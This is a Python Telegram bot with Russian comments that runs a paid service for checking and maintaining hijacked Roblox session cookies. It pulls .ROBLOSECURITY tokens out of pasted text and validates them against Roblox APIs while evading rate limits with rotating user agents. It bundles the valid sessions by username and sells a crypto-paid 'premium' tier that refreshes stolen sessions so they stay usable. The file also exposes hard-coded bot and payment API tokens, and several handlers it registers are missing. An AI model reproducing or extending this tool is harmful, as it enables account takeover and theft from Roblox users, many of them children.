import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# Конфигурация
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """Создание инвойса для оплаты"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'Оплата подписки для пользователя {user_id}',
                'paid_btn_name': 'callback',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 3600  # 1 час
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"Ошибка API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка создания инвойса: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """Проверка статуса инвойса"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "Инвойс не найден"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка проверки статуса: {str(e)}"
    
    async def validate_payment(self, user_id: int, amount: float):
        """Строгая проверка оплаты"""
        try:
            # Получаем все инвойсы пользователя
            response = requests.get(
                f"{self.api_url}getInvoices",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for invoice in data['result']['items']:
                        if (invoice.get('payload') == str(user_id) and 
                            invoice.get('status') == 'paid' and
                            float(invoice.get('amount', 0)) >= amount):
                            # Дополнительная проверка времени
                            paid_at = datetime.fromtimestamp(invoice.get('paid_at', 0))
                            if datetime.now() - paid_at < timedelta(hours=24):
                                return True, invoice
                    return False, "Оплата не найдена или не соответствует требованиям"
                else:
                    return False, "Ошибка получения списка инвойсов"
            else:
                return False, f"HTTP ошибка: {response.status_code}"
                
        except Exception as e:
            return False, f"Ошибка проверки оплаты: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.subscriptions = {}
        self.crypto_payment = CryptoPayment()
        self.premium_prices = {
            '1_week': 5.0,    # 5 USDT за неделю
            '1_month': 15.0,  # 15 USDT за месяц
            '3_months': 40.0  # 40 USDT за 3 месяца
        }
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"⚠️ Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"⚠️ Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def extract_cookies_from_text(self, text):
        cookies = []
        warning_pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]+(?:\|[^\s]*)*'
        warning_matches = re.findall(warning_pattern, text)
        
        for match in warning_matches:
            cookie_candidate = match.strip()
            if len(cookie_candidate) > 50:
                cookies.append(cookie_candidate)
                print(f"🔍 Найдена куки: {cookie_candidate[:80]}...")
        
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text and
                'Sharing-this-will-allow-someone-to-log-in-as-you' in clean_text):
                cookies.append(clean_text)
                print(f"🔍 Найдена чистая куки: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        return cookie_data.strip()

    def refresh_cookie_with_auth_key(self, cookie_data, auth_key):
        try:
            if not cookie_data.startswith('.ROBLOSECURITY='):
                cookie_string = f'.ROBLOSECURITY={cookie_data}'
            else:
                cookie_string = cookie_data
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_string,
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': auth_key
            }
            
            refresh_url = 'https://auth.roblox.com/v2/logout'
            response = requests.post(refresh_url, headers=headers, timeout=10)
            
            if response.status_code == 200 or response.status_code == 403:
                if 'set-cookie' in response.headers:
                    new_cookies = response.headers['set-cookie']
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        return True, new_cookie, "✅ Куки успешно обновлена"
            
            return False, cookie_data, "❌ Не удалось обновить куки"
            
        except Exception as e:
            print(f"❌ Ошибка обновления куки: {e}")
            return False, cookie_data, f"❌ Ошибка: {str(e)}"

    def simple_cookie_validation(self, cookie_data):
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        time.sleep(random.uniform(1, 3))
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
                
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"✅ VALID - User: {username} (ID: {user_id})", username, user_id
            
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "✅ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"❌ Ошибка проверки: {e}")
            return False, cookie_clean, f"❌ ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "❌ INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"🔍 Найдено куки в тексте: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "❌ В тексте не найдено ни одной куки"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"🔍 Проверяю куки {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"✅ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"❌ {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def subscribe_user(self, user_id, cookie_index, auth_key, plan_type):
        if user_id not in self.user_cookies:
            return False, "❌ Куки не найдены"
        
        if cookie_index >= len(self.user_cookies[user_id]['valid_cookies']):
            return False, "❌ Неверный индекс куки"
        
        cookie = self.user_cookies[user_id]['valid_cookies'][cookie_index]
        username = self.user_cookies[user_id]['usernames'][cookie_index]
        user_id_val = self.user_cookies[user_id]['user_ids'][cookie_index]
        
        # Определяем срок подписки
        if plan_type == '1_week':
            expiry_date = datetime.now() + timedelta(days=7)
        elif plan_type == '1_month':
            expiry_date = datetime.now() + timedelta(days=30)
        elif plan_type == '3_months':
            expiry_date = datetime.now() + timedelta(days=90)
        else:
            return False, "❌ Неверный тип подписки"
        
        self.subscriptions[user_id] = {
            'cookie': cookie,
            'username': username,
            'user_id': user_id_val,
            'auth_key': auth_key,
            'plan_type': plan_type,
            'subscribe_date': datetime.now(),
            'expiry_date': expiry_date,
            'last_refresh': datetime.now(),
            'is_premium': True
        }
        
        return True, f"✅ Премиум подписка активирована для {username} до {expiry_date.strftime('%d.%m.%Y')}"

    def refresh_subscribed_cookie(self, user_id):
        if user_id not in self.subscriptions:
            return False, "❌ Подписка не найдена"
        
        subscription = self.subscriptions[user_id]
        
        # Проверяем не истекла ли подписка
        if datetime.now() > subscription['expiry_date']:
            del self.subscriptions[user_id]
            return False, "❌ Срок подписки истек"
        
        cookie = subscription['cookie']
        auth_key = subscription['auth_key']
        
        success, new_cookie, message = self.refresh_cookie_with_auth_key(cookie, auth_key)
        
        if success:
            self.subscriptions[user_id]['cookie'] = new_cookie
            self.subscriptions[user_id]['last_refresh'] = datetime.now()
            
            is_valid, _, status, username, _ = self.simple_cookie_validation(new_cookie)
            if is_valid:
                return True, f"✅ Куки успешно обновлена и валидна\n👤 Пользователь: {username}"
            else:
                return False, "❌ Куки обновлена, но не прошла валидацию"
        else:
            return False, message

    def get_command_keyboard(self):
        """Клавиатура с командами для нижней части сообщений"""
        keyboard = [
            [InlineKeyboardButton("🔍 Проверить куки", callback_data="check_cookies"),
             InlineKeyboardButton("📊 Статистика", callback_data="show_stats")],
            [InlineKeyboardButton("💎 Премиум", callback_data="premium_info"),
             InlineKeyboardButton("🔄 Моя подписка", callback_data="my_subscription")],
            [InlineKeyboardButton("ℹ️ Помощь", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
🔍 Бот для проверки Roblox куки активирован

Основные функции:
• Проверка валидности куки
• Распределение по файлам  
• Премиум подписка с авто-обновлением
• Строгая проверка оплаты

Просто отправьте куки текстом или файлом для проверки.
    """
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=checker.get_command_keyboard()
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"""
📊 СТАТИСТИКА ПРОВЕРОК:

• Всего проверено: {checker.checked_count}
• Валидных куки: {checker.valid_count}
• Невалидных: {checker.checked_count - checker.valid_count}
• Процент валидных: {checker.valid_count/max(1, checker.checked_count)*100:.1f}%
• Активных подписок: {len(checker.subscriptions)}
    """
    await update.message.reply_text(
        stats_text,
        reply_markup=checker.get_command_keyboard()
    )

async def premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    premium_text = f"""
💎 ПРЕМИУМ ПОДПИСКА

Преимущества:
• Автоматическое обновление куки
• Приоритетная проверка
• Неограниченное количество запросов
• Поддержка 24/7

Тарифы:
• 1 неделя - {checker.premium_prices['1_week']} USDT
• 1 месяц - {checker.premium_prices['1_month']} USDT  
• 3 месяца - {checker.premium_prices['3_months']} USDT

Для оплаты используйте /buy_premium
    """
    
    keyboard = [
        [InlineKeyboardButton("💰 Купить премиум", callback_data="buy_premium")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(premium_text, reply_markup=reply_markup)

async def buy_premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("1 неделя", callback_data="buy_1_week")],
        [InlineKeyboardButton("1 месяц", callback_data="buy_1_month")],
        [InlineKeyboardButton("3 месяца", callback_data="buy_3_months")],
        [InlineKeyboardButton("🔙 Назад", callback_data="premium_info")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "💰 ВЫБЕРИТЕ ТАРИФ ПРЕМИУМ:",
        reply_markup=reply_markup
    )

async def handle_payment_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan_type = query.data.replace('buy_', '')
    
    if plan_type not in checker.premium_prices:
        await query.edit_message_text("❌ Неверный тип подписки")
        return
    
    amount = checker.premium_prices[plan_type]
    
    # Создаем инвойс
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description=f"Премиум подписка {plan_type.replace('_', ' ')}",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
💰 ОПЛАТА ПРЕМИУМ ПОДПИСКИ

Тариф: {plan_type.replace('_', ' ')}
Сумма: {amount} USDT
Сеть: TRC-20

Для оплаты перейдите по ссылке:
{invoice_url}

После оплаты нажмите кнопку "Проверить оплату"
        """
        
        keyboard = [
            [InlineKeyboardButton("🔗 Перейти к оплате", url=invoice_url)],
            [InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_payment_{invoice_id}_{plan_type}")],
            [InlineKeyboardButton("🔙 Назад", callback_data="premium_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        await query.edit_message_text(f"❌ Ошибка создания инвойса: {result}")

async def check_payment_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data_parts = query.data.split('_')
    invoice_id = int(data_parts[2])
    plan_type = data_parts[3]
    
    await query.edit_message_text("🔍 Проверяю статус оплаты...")
    
    # Строгая проверка оплаты
    amount = checker.premium_prices[plan_type]
    success, result = await checker.crypto_payment.validate_payment(user_id, amount)
    
    if success:
        # Активируем премиум подписку
        if user_id in checker.user_cookies and checker.user_cookies[user_id]['valid_cookies']:
            # Используем первую валидную куки для подписки
            success_sub, message = checker.subscribe_user(
                user_id=user_id,
                cookie_index=0,
                auth_key="premium_activated",  # Пользователь добавит auth key позже
                plan_type=plan_type
            )
            
            if success_sub:
                await query.edit_message_text(
                    f"✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n{message}\n\n"
                    f"Теперь отправьте auth key для активации авто-обновления куки."
                )
            else:
                await query.edit_message_text(f"✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n{message}")
        else:
            await query.edit_message_text(
                "✅ ОПЛАТА ПОДТВЕРЖДЕНА!\n\n"
                "Премиум статус активирован. Теперь отправьте куки для проверки "
                "и активации авто-обновления."
            )
    else:
        await query.edit_message_text(
            f"❌ ОПЛАТА НЕ НАЙДЕНА\n\n"
            f"Причина: {result}\n\n"
            f"Если вы произвели оплату, подождите несколько минут и проверьте снова."
        )

# ... остальные функции (handle_message, button_handler, etc.) остаются без изменений
# но добавляем reply_markup=checker.get_command_keyboard() в конец каждого сообщения

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("premium", premium_command))
    app.add_handler(CommandHandler("buy_premium", buy_premium_command))
    app.add_handler(CommandHandler("mysub", mysub_command))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_key))
    app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Добавляем обработчики для оплаты
    app.add_handler(CallbackQueryHandler(handle_payment_selection, pattern="^buy_"))
    app.add_handler(CallbackQueryHandler(check_payment_status, pattern="^check_payment_"))
    
    print("🤖 Бот проверки Roblox куки с оплатой запущен...")
    print("✅ Бот готов к работе!")
    app.run_polling()

if __name__ == "__main__":
    main()
